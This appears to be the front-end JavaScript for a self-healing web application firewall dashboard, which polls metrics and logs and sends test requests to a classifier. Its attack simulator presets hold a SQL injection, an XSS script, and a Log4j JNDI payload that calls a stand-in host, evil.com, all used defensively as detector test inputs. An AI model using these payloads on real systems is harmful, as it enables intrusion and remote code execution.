// ============================================================
//  Self-Healing WAF — Dashboard JavaScript
// ============================================================

function escapeHtml(unsafe) {
    if (!unsafe) return "";
    return unsafe
         .replace(/&/g, "&amp;")
         .replace(/</g, "&lt;")
         .replace(/>/g, "&gt;")
         .replace(/"/g, "&quot;")
         .replace(/'/g, "&#039;");
}

// ---- Metrics Polling ----
async function fetchMetrics() {
    try {
        const response = await fetch('/dashboard/metrics');
        const data = await response.json();
        if (data.error) return;

        animateCounter('total-requests', data.total_requests);
        animateCounter('blocked-requests', data.blocked_requests);
        document.getElementById('block-rate').textContent = data.block_rate + '%';
        document.getElementById('avg-latency').textContent = data.avg_latency_ms + 'ms';
        document.getElementById('pending-reviews').textContent = data.pending_reviews;
        document.getElementById('healed-rules').textContent = data.healed_rules;
    } catch (error) {
        console.error("Metrics fetch error:", error);
    }
}

// ---- Animated Counter ----
function animateCounter(elementId, target) {
    const el = document.getElementById(elementId);
    const current = parseInt(el.textContent) || 0;
    if (current === target) return;

    const duration = 400;
    const start = performance.now();

    function step(timestamp) {
        const elapsed = timestamp - start;
        const progress = Math.min(elapsed / duration, 1);
        const eased = 1 - Math.pow(1 - progress, 3); // ease-out cubic
        el.textContent = Math.round(current + (target - current) * eased);
        if (progress < 1) requestAnimationFrame(step);
    }
    requestAnimationFrame(step);
}

// ---- Logs Polling ----
let previousLogIds = new Set();

async function fetchLogs() {
    try {
        const response = await fetch('/dashboard/logs');
        const data = await response.json();
        if (data.error || !data.logs) return;

        const tbody = document.getElementById('logs-body');

        // Build new ID set
        const newIds = new Set(data.logs.map(l => l.source + '-' + l.id));

        tbody.innerHTML = '';

        data.logs.forEach(log => {
            const tr = document.createElement('tr');
            const logKey = log.source + '-' + log.id;

            // Animate new rows
            if (!previousLogIds.has(logKey)) {
                tr.classList.add('new-row');
            }

            // Format timestamp
            const date = new Date(log.timestamp);
            const timeStr = date.toLocaleTimeString([], { hour12: false, hour: '2-digit', minute:'2-digit', second:'2-digit' });

            // Prediction tag
            const predClass = log.prediction === 'NORMAL' ? 'normal' : 'anomalous';
            const predIcon = log.prediction === 'NORMAL' ? '✓' : '⚠';

            // Status tag
            let statusClass = 'logged';
            if (log.status === 'PENDING') statusClass = 'pending';
            else if (log.status === 'VERIFIED_ATTACK') statusClass = 'anomalous';
            else if (log.status === 'VERIFIED_NORMAL') statusClass = 'normal';

            // Latency display
            let latencyStr = log.latency_ms;
            if (typeof log.latency_ms === 'number') {
                latencyStr = log.latency_ms.toFixed(2) + 'ms';
            }

            tr.innerHTML = `
                <td>${timeStr}</td>
                <td>${escapeHtml(log.source)}</td>
                <td class="payload-cell" title="${escapeHtml(log.payload)}">${escapeHtml(log.payload)}</td>
                <td><span class="tag ${predClass}">${predIcon} ${log.prediction}</span></td>
                <td>${log.confidence}%</td>
                <td>${latencyStr}</td>
                <td><span class="tag ${statusClass}">${log.status}</span></td>
            `;
            tbody.appendChild(tr);
        });

        previousLogIds = newIds;

    } catch (error) {
        console.error("Logs fetch error:", error);
    }
}

// ---- Live Attack Simulator ----
const PRESETS = {
    sqli: "http://localhost:8080/login?user=admin' OR 1=1 --&pwd=x HTTP/1.1",
    xss: "http://localhost:8080/search?q=<script>alert('XSS')</script> HTTP/1.1",
    log4j: "http://localhost:8080/api?token=${jndi:ldap://evil.com/exploit} HTTP/1.1",
    normal: "http://localhost:8080/tienda1/index.jsp HTTP/1.1"
};

function sendPreset(type) {
    document.getElementById('test-input').value = PRESETS[type];
    sendTestPayload();
}

async function sendTestPayload() {
    const input = document.getElementById('test-input');
    const resultDiv = document.getElementById('test-result');
    const payload = input.value.trim();

    if (!payload) {
        input.focus();
        return;
    }

    resultDiv.className = 'test-result';
    resultDiv.textContent = 'Analyzing...';

    try {
        const response = await fetch('/shadow', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ request_string: payload })
        });
        const data = await response.json();

        const isDanger = data.prediction === 'ANOMALOUS';
        resultDiv.className = `test-result ${isDanger ? 'result-danger' : 'result-safe'}`;

        resultDiv.innerHTML = `
            <strong>${isDanger ? '🚨 THREAT DETECTED' : '✅ SAFE TRAFFIC'}</strong><br>
            Prediction: <strong>${data.prediction}</strong> &nbsp;|&nbsp; 
            Confidence: <strong>${data.confidence}%</strong> &nbsp;|&nbsp;
            Latency: <strong>${data.latency_ms}ms</strong><br>
            <span style="opacity:0.7">Payload logged to shadow database for self-healing analysis.</span>
        `;

        // Refresh data immediately
        setTimeout(() => { fetchMetrics(); fetchLogs(); }, 500);

    } catch (error) {
        resultDiv.className = 'test-result result-danger';
        resultDiv.textContent = 'Error: Could not reach WAF API. Is the server running?';
    }
}

// Enter key support for the input
document.addEventListener('DOMContentLoaded', () => {
    document.getElementById('test-input').addEventListener('keydown', (e) => {
        if (e.key === 'Enter') sendTestPayload();
    });
});

// ---- Initial Load + Polling ----
fetchMetrics();
fetchLogs();

setInterval(() => {
    fetchMetrics();
    fetchLogs();
}, 2000);
